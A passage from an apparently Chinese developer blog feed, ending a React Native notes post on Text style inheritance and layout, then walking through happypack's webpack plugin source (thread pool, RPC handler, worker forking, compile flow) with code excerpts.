<h3 id="Text-的样式继承"><a href="#Text-的样式继承" class="headerlink" title="Text 的样式继承"></a>Text 的样式继承</h3><p>实际上 React-native 里边是没有样式继承这种说法的， 但是对于 Text 元素里边的 Text 元素，上面的例子可以看出存在继承。 那既然有继承，问题就来了！</p>
<p>到底是继承的最外层的 Text 的值呢，还是继承父亲 Text 的值呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">      文本样式继承 </span><br><span class="line">  &lt;&#x2F;Text&gt;</span><br><span class="line"></span><br><span class="line">  &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#333333&#39;, padding: 10&#125;&#125;&gt;</span><br><span class="line">    &lt;Text style&#x3D;&#123;&#123;color: &#39;white&#39;&#125;&#125;&gt;</span><br><span class="line">      &lt;Text style&#x3D;&#123;&#123;color: &#39;red&#39;&#125;&#125; onPress&#x3D;&#123;this.onPressTitle&#125;&gt;</span><br><span class="line">         文本元素&#123;&#39;\n&#39;&#125;</span><br><span class="line">        &lt;Text&gt; 我是 white 还是 red 呢？&#123;&#39;\n&#39;&#125; &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;&#x2F;Text&gt;</span><br><span class="line">      &lt;Text&gt; 我应该是 white 的 &lt;&#x2F;Text&gt;</span><br><span class="line">    &lt;&#x2F;Text&gt;</span><br><span class="line">  &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-b9f60cacd4e50154.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>结果可见是直接继承父亲 Text 的。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li> react 宽度基于<code>pt</code>为单位， 可以通过<code>Dimensions</code> 来获取宽高，<code>PixelRatio</code> 获取密度，如果想使用百分比，可以通过获取屏幕宽度手动计算。</li>
<li>基于 flex 的布局<ol>
<li> view 默认宽度为 100%</li>
<li> 水平居中用<code>alignItems</code>, 垂直居中用<code>justifyContent</code></li>
<li> 基于 flex 能够实现现有的网格系统需求，且网格能够各种嵌套无 bug</li>
</ol>
</li>
<li>图片布局<ol>
<li> 通过<code>Image.resizeMode</code>来适配图片布局，包括<code>contain</code>, <code>cover</code>, <code>stretch</code></li>
<li> 默认不设置模式等于 cover 模式</li>
<li> contain 模式自适应宽高，给出高度值即可</li>
<li> cover 铺满容器，但是会做截取</li>
<li> stretch 铺满容器，拉伸</li>
</ol>
</li>
<li>定位<ol>
<li> 定位相对于父元素，父元素不用设置 position 也行</li>
<li> padding 设置在 Text 元素上的时候会存在 bug。所有 padding 变成了 marginBottom</li>
</ol>
</li>
<li>文本元素<ol>
<li> 文字必须放在 Text 元素里边</li>
<li> Text 元素可以相互嵌套，且存在样式继承关系</li>
<li> <code>numberOfLines</code> 需要放在最外层的 Text 元素上，且虽然截取了文字但是还是会占用空间<br>xi</li>
</ol>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>happy pack 原理解析</title>
    <url>/nirvana/webpack/webpack/happypack%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 webpack 打包速度很慢的时候，我们想过很多办法去优化打包速度，**<a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">happypack</a>** 就是一个用来加速打包的插件。</p>
<p>本质上， <strong>happypack</strong> 是用通过 js 的多进程来实现打包加速，需要注意的是，创建子进程和子进程和主进程之间通信也是有开销的，当你的 <strong>loader</strong> 很慢的时候，可以加上 <strong>happypack</strong>，否则，可能会编译的更慢！</p>
<h2 id="happypack-加载入口"><a href="#happypack-加载入口" class="headerlink" title="happypack 加载入口"></a>happypack 加载入口</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-69d6936ccc37b38f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>HappyPack位于webpack和您的主要源文件（例如JS源）之间，在该文件中，大量的加载程序发生转换。每次webpack解析模块时，HappyPack都会获取该模块及其所有依赖项，并将这些文件分发到多个工作程序“线程”。</p>
<h3 id="webpack-的配置"><a href="#webpack-的配置" class="headerlink" title="webpack 的配置"></a>webpack 的配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var HappyPack &#x3D; require(&#39;happypack&#39;);</span><br><span class="line">var happyThreadPool &#x3D; HappyPack.ThreadPool(&#123; size: os.cpus().length &#125;);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">module: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: &#x2F;\.(js?|tsx?|ts?)$&#x2F;,</span><br><span class="line">                include: [</span><br><span class="line">                    path.resolve(__dirname, &#39;src&#39;),</span><br><span class="line">                ],</span><br><span class="line">                use: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        loader: &#39;happypack&#x2F;loader?id&#x3D;happyBabel&#39;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                ],</span><br><span class="line">            &#125;,</span><br><span class="line">...</span><br><span class="line">plugins: [</span><br><span class="line">        new HappyPack(&#123;</span><br><span class="line">            id: &#39;happyBabel&#39;,</span><br><span class="line">            loaders: [&#39;babel-loader&#39;],</span><br><span class="line">            threadPool: happyThreadPool,</span><br><span class="line">            verbose: true,</span><br><span class="line">        &#125;)</span><br><span class="line">]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可以看到 happypack 是通过 <strong><a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">loader</a></strong> 调用 <strong><a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">plugin</a></strong> 来打成插件的目的。<strong>loader</strong> 指向 <strong>HappyLoader.js</strong> , loader 执行的时候，根据 <strong>?</strong> 后面的 <strong>id</strong> 来找到对应的插件。</p>
<h2 id="happypack-解析过程"><a href="#happypack-解析过程" class="headerlink" title="happypack 解析过程"></a>happypack 解析过程</h2><h3 id="参数初始化"><a href="#参数初始化" class="headerlink" title="参数初始化"></a>参数初始化</h3><p>在我们指定的 happypack loader 加载之前，webpack 会根据 option 初始化配置信息之后再去执行 loader。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; HappyPlugin.js</span><br><span class="line">this.name &#x3D; &#39;HappyPack&#39;;</span><br><span class="line">  this.state &#x3D; &#123;</span><br><span class="line">    loaders: [],</span><br><span class="line">    baseLoaderRequest: &#39;&#39;,</span><br><span class="line">    foregroundThreadPool: null,</span><br><span class="line">    verbose: false,</span><br><span class="line">    debug: false,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  this.config &#x3D; OptionParser(userConfig, &#123;</span><br><span class="line">    id:                       &#123; type: &#39;string&#39;, default: &#39;1&#39; &#125;,</span><br><span class="line">    compilerId:               &#123; type: &#39;string&#39;, default: &#39;default&#39; &#125;,</span><br><span class="line">    tempDir:                  &#123; deprecated: true &#125;,</span><br><span class="line">    threads:                  &#123; type: &#39;number&#39;, default: 3 &#125;,</span><br><span class="line">    threadPool:               &#123; type: &#39;object&#39;, default: null &#125;,</span><br><span class="line">    verbose:                  &#123; type: &#39;boolean&#39;, default: true &#125;,</span><br><span class="line">    verboseWhenProfiling:     &#123; type: &#39;boolean&#39;, default: false &#125;,</span><br><span class="line">    debug:                    &#123; type: &#39;boolean&#39;, default: process.env.DEBUG &#x3D;&#x3D;&#x3D; &#39;1&#39; &#125;,</span><br><span class="line">    enabled:                  &#123; deprecated: true &#125;,</span><br><span class="line">    &#x2F;&#x2F; we don&#39;t want this to be documented &#x2F; exposed since it&#39;s an</span><br><span class="line">    &#x2F;&#x2F; implementation detail + not having it on means a bug, but we&#39;re making it</span><br><span class="line">    &#x2F;&#x2F; configurable for testing purposes</span><br><span class="line">    bufferedMessaging:        &#123; type: &#39;boolean&#39;, default: process.platform &#x3D;&#x3D;&#x3D; &#39;win32&#39; &#125;,</span><br><span class="line">    loaders:                  &#123;</span><br><span class="line">      validate: function(value) &#123;</span><br><span class="line">        if (!Array.isArray(value)) &#123;</span><br><span class="line">          return &#39;Loaders must be an array!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if (value.length &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">          return &#39;You must specify at least one loader!&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        else if (value.some(function(loader) &#123;</span><br><span class="line">          return typeof loader !&#x3D;&#x3D; &#39;string&#39; &amp;&amp; !loader.path &amp;&amp; !loader.loader;</span><br><span class="line">        &#125;)) &#123;</span><br><span class="line">          return &#39;Loader must have a @path or @loader property or be a string.&#39;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, &quot;HappyPack&quot;);</span><br><span class="line"></span><br><span class="line">  this.id &#x3D; this.config.id;</span><br></pre></td></tr></table></figure>

<p>**OptionParser **方法是一个参数校验，初始化的方法<br>参数说明:</p>
<ul>
<li>  id: 在配置文件中设置的与 loader 关联的 id 首先会设置到实例上，为了后续 loader 与 plugin 能进行一对一匹配，在 *** HappyLoader.js** 中有相对应的判断</li>
<li>  compilerId: 用于查找当前 webpack compioler 对象的上下文，默认 default</li>
<li>  tmpDir: 存放打包缓存文件的位置</li>
<li>  verbose: 是否输出过程日志</li>
<li>  debug: 是否输出父子进程之间的 debug 信息</li>
<li>  bufferedMessaging: 在 windows 系统中是否是通过 buffered 传输</li>
<li>  loaders: 因为配置中文件的处理 loader 都指向了 happypack 提供的 loader ,这里配置的对应文件实际需要运行的 loader</li>
</ul>
<h3 id="进程池创建"><a href="#进程池创建" class="headerlink" title="进程池创建"></a>进程池创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; HappyPlugin.prototype.apply</span><br><span class="line">this.threadPool &#x3D; this.config.threadPool || HappyThreadPool(&#123;</span><br><span class="line">    id: this.id,</span><br><span class="line">    size: this.config.threads,</span><br><span class="line">    verbose: this.state.verbose,</span><br><span class="line">    debug: this.state.debug,</span><br><span class="line">    bufferedMessaging: this.config.bufferedMessaging,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="rpcHandler"><a href="#rpcHandler" class="headerlink" title="rpcHandler"></a>rpcHandler</h4><p>在创建子进程之前会生成一个 rpcHandler 对象, rpcHandler 是 **HappyRPCHandler **的实例<br><em>HappyRPCHandler.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function HappyRPCHandler() &#123;</span><br><span class="line">  this.activeLoaders &#x3D; new SharedPtrMap();</span><br><span class="line">  this.activeCompilers &#x3D; new SharedPtrMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>SharedPtrMap</em> 给 <em>activeLoaders</em> 和 <em>activeCompilers</em> 定义了set、get 和 delete 方法，用于其他方法赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HappyRPCHandler.prototype.registerActiveCompiler &#x3D; function(id, compiler) &#123;</span><br><span class="line">  this.activeCompilers.set(id || DEFAULT_COMPILER_ID, compiler);</span><br><span class="line">&#125;;</span><br><span class="line">HappyRPCHandler.prototype.unregisterActiveCompiler &#x3D; function(id) &#123;</span><br><span class="line">  this.activeCompilers.delete(id || DEFAULT_COMPILER_ID);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HappyRPCHandler.prototype.registerActiveLoader &#x3D; function(id, instance) &#123;</span><br><span class="line">  this.activeLoaders.set(id || DEFAULT_LOADER_ID, instance);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HappyRPCHandler.prototype.unregisterActiveLoader &#x3D; function(id) &#123;</span><br><span class="line">  this.activeLoaders.delete(id || DEFAULT_LOADER_ID);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>rpcHandler</strong> 的主要作用是: 绑定当前运行的 loader 与 compiler ，同时在文件中，针对 loader 与 compiler 定义调用接口:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COMPILER_RPCs &#x3D; &#123;</span><br><span class="line">  resolve: function(compiler, payload, done) &#123;</span><br><span class="line">    var resolver &#x3D; compiler.resolvers.normal;</span><br><span class="line">    var resolve &#x3D; compiler.resolvers.normal.resolve;</span><br><span class="line">    ...</span><br><span class="line">    resolve.call(resolver, payload.context, payload.context, payload.resource, done);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOADER_RPCS &#x3D; &#123;</span><br><span class="line">  emitWarning: function(loader, payload) &#123;</span><br><span class="line">    loader.emitWarning(payload.message);</span><br><span class="line">  &#125;,</span><br><span class="line">  emitError: function(loader, payload) &#123;</span><br><span class="line">      loader.emitError(payload.message);</span><br><span class="line">  &#125;,</span><br><span class="line">  addDependency: function(loader, payload) &#123;</span><br><span class="line">      loader.addDependency(payload.file);</span><br><span class="line">  &#125;,</span><br><span class="line">  addContextDependency: function(loader, payload) &#123;</span><br><span class="line">      loader.addContextDependency(payload.file);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h4><p><em>HappyThreadPool.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  var threads &#x3D; createThreads(config.size, rpcHandler, &#123;</span><br><span class="line">    id: config.id,</span><br><span class="line">    verbose: config.verbose,</span><br><span class="line">    debug: config.debug,</span><br><span class="line">    buffered: config.hasOwnProperty(&#39;bufferedMessaging&#39;) ?</span><br><span class="line">      config.bufferedMessaging :</span><br><span class="line">      process.platform &#x3D;&#x3D;&#x3D; &#39;win32&#39;,</span><br><span class="line">  &#125;);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">function createThreads(count, rpcHandler, config) &#123;</span><br><span class="line">  var set &#x3D; []</span><br><span class="line"></span><br><span class="line">  for (var threadId &#x3D; 0; threadId &lt; count; ++threadId) &#123;</span><br><span class="line">    var fullThreadId &#x3D; config.id ? [ config.id, threadId ].join(&#39;:&#39;) : threadId;</span><br><span class="line">    set.push(HappyThread(fullThreadId, rpcHandler, config));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return set;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>threads</strong> 为 <strong>HappyThread</strong> 返回的操作子进程的对象</p>
<p><em>HappyThread.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var WORKER_BIN &#x3D; path.resolve(__dirname, &#39;HappyWorkerChannel.js&#39;);</span><br><span class="line">....</span><br><span class="line"> return &#123;</span><br><span class="line">    open: function(onReady) &#123;</span><br><span class="line">      var emitReady &#x3D; Once(onReady);</span><br><span class="line"></span><br><span class="line">      fd &#x3D; fork(WORKER_BIN, [id, JSON.stringify(&#123; buffered: config.buffered &#125;)], &#123;</span><br><span class="line">        &#x2F;&#x2F; Do not pass through any arguments that were passed to the main</span><br><span class="line">        &#x2F;&#x2F; process (webpack or node) because they could have unwanted</span><br><span class="line">        &#x2F;&#x2F; side-effects, see issue #47</span><br><span class="line">        execArgv: [],</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      fd.on(&#39;error&#39;, throwError);</span><br><span class="line">      fd.on(&#39;exit&#39;, function(exitCode) &#123;</span><br><span class="line">        if (exitCode !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">          emitReady(&#39;HappyPack: worker exited abnormally with code &#39; + exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      fd.on(&#39;message&#39;, function(message) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    configure: function(compilerId, compilerOptions, done) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param &#123;Object&#125; params</span><br><span class="line">     * @param &#123;String&#125; params.compiledPath</span><br><span class="line">     * @param &#123;Object&#125; params.loaderContext</span><br><span class="line">     *</span><br><span class="line">     * @param &#123;Function&#125; done</span><br><span class="line">     *&#x2F;</span><br><span class="line">    compile: function(params, done) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    isOpen: function() &#123;</span><br><span class="line">      return !!fd;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    close: function() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到目前为止，子进程已经创建完成。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>我们回到 <strong>HappyPlugin.js</strong>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compiler.plugin(&#39;watch-run&#39;, function(_, done) &#123;</span><br><span class="line">    if (engageWatchMode() &#x3D;&#x3D;&#x3D; fnOnce.ALREADY_CALLED) &#123;</span><br><span class="line">      done();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      that.start(compiler, done);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">compiler.plugin(&#39;run&#39;, that.start.bind(that));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这里在 <strong>run</strong> 和 <strong>watch-tun</strong> 两个 <strong><a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">钩子</a></strong> 中调用了 this.start 进行初始化.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HappyPlugin.prototype.start &#x3D; function(compiler, done) &#123;</span><br><span class="line">  var that &#x3D; this;</span><br><span class="line">  ...</span><br><span class="line">  async.series([</span><br><span class="line">    function resolveLoaders(callback) &#123;&#125;,</span><br><span class="line">    function launchAndConfigureThreads(callback) &#123;&#125;,</span><br><span class="line">    function announceReadiness(callback) &#123;&#125;</span><br><span class="line">  ], done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>start函数通过 <strong><a href="https://segmentfault.com/a/1190000021037299?utm_source=tag-newest#">async.series</a></strong> 将整个过程串联起来。</p>
<p>1） resolveLoaders<br>loader 解析，把 loaders 和 baseLoaderRequest 塞到 this.state 里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function resolveLoaders(callback) &#123;</span><br><span class="line">      var normalLoaders &#x3D; that.config.loaders.reduce(function(list, entry) &#123;</span><br><span class="line">        return list.concat(WebpackUtils.normalizeLoader(entry));</span><br><span class="line">      &#125;, []);</span><br><span class="line"></span><br><span class="line">      var loaderPaths &#x3D; normalLoaders.map(function(loader) &#123;</span><br><span class="line">        return loader.path;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      WebpackUtils.resolveLoaders(compiler, loaderPaths, function(err, resolvedPaths) &#123;</span><br><span class="line">        if (err) return callback(err);</span><br><span class="line"></span><br><span class="line">        var withResolvedPaths &#x3D; normalLoaders.map(function(loader, index) &#123;</span><br><span class="line">          var resolvedPath &#x3D; resolvedPaths[index];</span><br><span class="line"></span><br><span class="line">          return Object.assign(&#123;&#125;, loader, &#123;</span><br><span class="line">            path: resolvedPath,</span><br><span class="line">            request: loader.query ? (loader.path + loader.query) : loader.path</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        that.state.loaders &#x3D; withResolvedPaths;</span><br><span class="line">        that.state.baseLoaderRequest &#x3D; withResolvedPaths.map(function(loader) &#123;</span><br><span class="line">          return loader.path + (loader.query || &#39;&#39;);</span><br><span class="line">        &#125;).join(&#39;!&#39;);</span><br><span class="line"></span><br><span class="line">        callback();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>2） launchAndConfigureThreads<br>启动和初始化进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">that.threadPool.start(that.config.compilerId, compiler, serializedOptions, callback);</span><br></pre></td></tr></table></figure>

<p>这里调用到了 <em>HappyThreadPool.js</em> 里的 <strong>start</strong> 方法<br>that.threadPool 是进程池创建得到的对象<br>参数说明：</p>
<ul>
<li>  that.config.compilerId: 用于查找当前 webpack compioler 对象的上下文，默认 default</li>
<li>  compiler： 当前上下文compiler对象</li>
<li>  serializedOptions: webpack的入参，例如 webpack.common.js 的参数</li>
<li>  callback: 可以理解为下一步，<strong>async</strong> 库的使用方法</li>
</ul>
<p>** 第一步：registerActiveCompiler: <code>RPCHandler</code> 绑定 <code>compiler</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcHandler.registerActiveCompiler(compilerId, compiler);</span><br></pre></td></tr></table></figure>

<p>** 第二步: 找到当前没打开的子进程，调用 <code>open</code> fork 一份子进程<br><em>HappyThreadPool.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async.parallel(threads.filter(not(send(&#39;isOpen&#39;))).map(get(&#39;open&#39;))</span><br></pre></td></tr></table></figure>

<p><em>HappyThread.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open: function(onReady) &#123;</span><br><span class="line">      var emitReady &#x3D; Once(onReady);</span><br><span class="line"></span><br><span class="line">      fd &#x3D; fork(WORKER_BIN, [id, JSON.stringify(&#123; buffered: config.buffered &#125;)], &#123;</span><br><span class="line">        execArgv: [],</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      fd.on(&#39;error&#39;, throwError);</span><br><span class="line">      fd.on(&#39;exit&#39;, function(exitCode) &#123;</span><br><span class="line">        if (exitCode !&#x3D;&#x3D; 0) &#123;</span><br><span class="line">          emitReady(&#39;HappyPack: worker exited abnormally with code &#39; + exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      fd.on(&#39;message&#39;, function(message) &#123;</span><br><span class="line">        &#x2F;&#x2F; message 判断</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>子进程运行文件 <code>WORKER_BIN</code> 对应的是 <code>HappyWorkerChannel.js</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var HappyWorker &#x3D; require(&#39;.&#x2F;HappyWorker&#39;);</span><br><span class="line"></span><br><span class="line">if (process.argv[1] &#x3D;&#x3D;&#x3D; __filename) &#123;</span><br><span class="line">  startAsWorker();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startAsWorker() &#123;</span><br><span class="line">  HappyWorkerChannel(String(process.argv[2]), process);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function HappyWorkerChannel(id, fd, config) &#123;</span><br><span class="line">  var fakeCompilers &#x3D; &#123;&#125;;</span><br><span class="line">  var workers &#x3D; &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  fd.on(&#39;message&#39;, accept)</span><br><span class="line">  send(&#123; name: &#39;READY&#39; &#125;);</span><br><span class="line"></span><br><span class="line">  function accept(message) &#123;</span><br><span class="line">   &#x2F;&#x2F; 省略函数内容</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <em>fd.on(‘message’, accept)</em> 来监听主进程发送过来的消息</p>
<p>** 第三步: 子进程都生成之后，调用 <code>configure</code> 初始化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async.parallel(threads.map(function(thread) &#123;</span><br><span class="line">  return function(callback) &#123;</span><br><span class="line">    thread.configure(compilerId, compilerOptions, callback);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;), done);</span><br></pre></td></tr></table></figure>

<p>同样的，来到了 <em>HappyThread.js</em> 的 **configure **方法,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">configure: function(compilerId, compilerOptions, done) &#123;</span><br><span class="line">  var messageId &#x3D; generateMessageId();</span><br><span class="line"></span><br><span class="line">  callbacks[messageId] &#x3D; done;</span><br><span class="line"></span><br><span class="line">  send(&#123;</span><br><span class="line">    id: messageId,</span><br><span class="line">    name: &#39;CONFIGURE&#39;,</span><br><span class="line">    data: &#123;</span><br><span class="line">      compilerId: compilerId,</span><br><span class="line">      compilerOptions: compilerOptions</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>给子进程发送了一条 <code>CONFIGURE</code> 消息，<em>HappyWorkerChannel</em> 接收到做了如下处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findOrCreateFakeCompiler(message.data.compilerId)</span><br><span class="line">    .configure(JSONSerializer.deserialize(message.data.compilerOptions));</span><br><span class="line"></span><br><span class="line">send(&#123;</span><br><span class="line">    id: message.id,</span><br><span class="line">    name: &#39;CONFIGURE_DONE&#39;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>findOrCreateFakeCompiler</strong> 方法给 <code>workers</code> 和 <code>fakeCompiler</code> 赋值</p>
<ul>
<li>  fakeCompilers 是根据接收到的 messageId 作为key，来生成对应的模拟编译环境, 可以理解为为了模拟执行 loader 而模拟出来的上下文</li>
<li>  workers 是对应的子进程</li>
</ul>
<p>同时调用 <code>fakeCompiler</code> 的 configure 来初始化默认的 webpack 配置和编译上下文。</p>
<p>至此，happyPack 的初始化工作全部做完。</p>
<h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><h4 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h4><p>在 webpack 流程中，在源码文件完成内容读取之后，开始进入到 loader 的编译执行阶段，这时 HappyLoader 作为编译逻辑入口，开始进行编译流程。</p>
<p><em>HappyLoader</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function HappyLoader(sourceCode, sourceMap) &#123;</span><br><span class="line">  var query, compilerId, loaderId, remoteLoaderId, happyPlugin;</span><br><span class="line">  var callback &#x3D; this.async();</span><br><span class="line">  var pluginList &#x3D; locatePluginList(this);</span><br><span class="line"></span><br><span class="line">  query &#x3D; loaderUtils.getOptions(this) || &#123;&#125;;</span><br><span class="line">  compilerId &#x3D; query.compilerId || DEFAULT_COMPILER_ID;</span><br><span class="line">  loaderId &#x3D; query.id || DEFAULT_LOADER_ID;</span><br><span class="line">  remoteLoaderId &#x3D; &#39;Loader::&#39; + compilerId + loaderId.toString() + &#39;:&#39; + this.resource;</span><br><span class="line"></span><br><span class="line">  happyPlugin &#x3D; pluginList.filter(isHappy(loaderId))[0];</span><br><span class="line"></span><br><span class="line">  happyPlugin.compile(this, addWebpack2Context(this, &#123;</span><br><span class="line">    compilerId: compilerId,</span><br><span class="line">    context: this.context,</span><br><span class="line">    minimize: this.minimize,</span><br><span class="line">    remoteLoaderId: remoteLoaderId,</span><br><span class="line">    request: happyPlugin.generateRequest(this.resource),</span><br><span class="line">    resource: this.resource,</span><br><span class="line">    resourcePath: this.resourcePath,</span><br><span class="line">    resourceQuery: this.resourceQuery,</span><br><span class="line">    sourceCode: sourceCode,</span><br><span class="line">    sourceMap: sourceMap,</span><br><span class="line">    target: this.target,</span><br><span class="line">    useSourceMap: this._module.useSourceMap,</span><br><span class="line">  &#125;), callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据 loader 配置 <code>？</code>后面的参数找到对应的插件。<br>同时将原本的 <strong>loaderContext(this指向)</strong> 对象的一些参数例如 <strong>this.resource</strong>、<strong>this.resourcePath</strong> 等透传到 <strong>HappyPlugin.compile</strong> 方法进行编译</p>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>编译的起始位置在 <strong>HappyPlugin</strong> 的 <strong>compile</strong> 方法</p>
<p><em>HappyPlugin.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HappyPlugin.prototype.compile &#x3D; function(loader, loaderContext, done) &#123;</span><br><span class="line">  var threadPool &#x3D; this.state.foregroundThreadPool || this.threadPool;</span><br><span class="line"></span><br><span class="line">  threadPool.compile(loaderContext.remoteLoaderId, loader, &#123;</span><br><span class="line">    loaders: this.state.loaders,</span><br><span class="line">    loaderContext: loaderContext,</span><br><span class="line">  &#125;, function(err, result) &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">      done(ErrorSerializer.deserialize(err));</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      done(null,</span><br><span class="line">        result.compiledSource || &#39;&#39;,</span><br><span class="line">        SourceMapSerializer.deserialize(result.compiledMap)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里调用了进程池的 compile<br><em>HappyThreadPool.js</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compile: function(loaderId, loader, params, done) &#123;</span><br><span class="line">  var worker &#x3D; getThread();</span><br><span class="line"></span><br><span class="line">  rpcHandler.registerActiveLoader(loaderId, loader);</span><br><span class="line"></span><br><span class="line">  worker.compile(params, function(message) &#123;</span><br><span class="line">    rpcHandler.unregisterActiveLoader(loaderId);</span><br><span class="line"></span><br><span class="line">    done(message.error, message.data);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

